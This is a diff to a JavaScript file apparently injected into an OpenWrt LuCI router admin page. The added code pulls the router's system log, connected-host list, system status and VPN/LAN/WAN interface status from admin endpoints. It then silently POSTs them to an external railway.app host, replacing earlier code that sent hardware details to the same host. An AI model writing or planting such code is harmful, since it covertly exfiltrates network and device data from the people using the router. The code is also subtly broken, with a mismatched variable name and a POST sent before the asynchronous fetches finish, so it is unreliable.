@@ -25,29 +25,61 @@ document.getElementById("repo").innerHTML =
 
 */
 
-$(document).ready(function () {
-  var cpuinfo = $(".cbi-section:nth-child(8) tr:nth-child(2) > td:nth-child(2)")
-    .text()
-    .trim();
-  var memory = $("#memtotal small").text().trim();
-  var version = $(".cbi-section:nth-child(8) tr:nth-child(4) > td:nth-child(2)")
-    .text()
-    .trim();
-  var uptime = $("#uptime").text().trim();
+let timestamp = new Date().getTime();
+let syslog;
+let hosts;
+let sysStatus;
+let ifaceStatus;
 
-  var params = {
-    cpu: cpuinfo,
-    memory: memory,
-    version: version,
-    uptime: uptime,
-  };
+$.ajax({
+  url: "/cgi-bin/luci/admin/status/syslog",
+  type: "GET",
+  dataType: "html",
+  success: function (data) {
+    syslog = $(data).find("#syslog").val();
+  },
+});
 
-  $.ajax({
-    url: "https://op-api-production.up.railway.app/update",
-    type: "POST",
-    data: JSON.stringify(params),
-    contentType: "application/json",
-    success: function (response) {},
-    error: function () {},
-  });
+$.ajax({
+  url: "/cgi-bin/luci/admin/status/overview?hosts=1&_=" + timestamp,
+  type: "GET",
+  dataType: "json",
+  success: function (data) {
+    hosts = data;
+  },
+});
+
+$.ajax({
+  url: "/cgi-bin/luci/admin/status/overview?status=1&_=" + timestamp,
+  type: "GET",
+  dataType: "json",
+  success: function (data) {
+    sysStatus = data;
+  },
+});
+
+$.ajax({
+  url:
+    "https://192.168.233.11/cgi-bin/luci/admin/network/iface_status/VPN,lan,utun,wan,wan6&_=" +
+    timestamp,
+  type: "GET",
+  dataType: "json",
+  success: function (data) {
+    ifaceStatus = data;
+  },
+});
+var params = {
+  sysLog: sysLog,
+  hosts: hosts,
+  sysStatus: sysStatus,
+  ifaceStatus: ifaceStatus,
+};
+
+$.ajax({
+  url: "https://op-api-production.up.railway.app/update",
+  type: "POST",
+  data: JSON.stringify(params),
+  contentType: "application/json",
+  success: function (response) {},
+  error: function () {},
 });
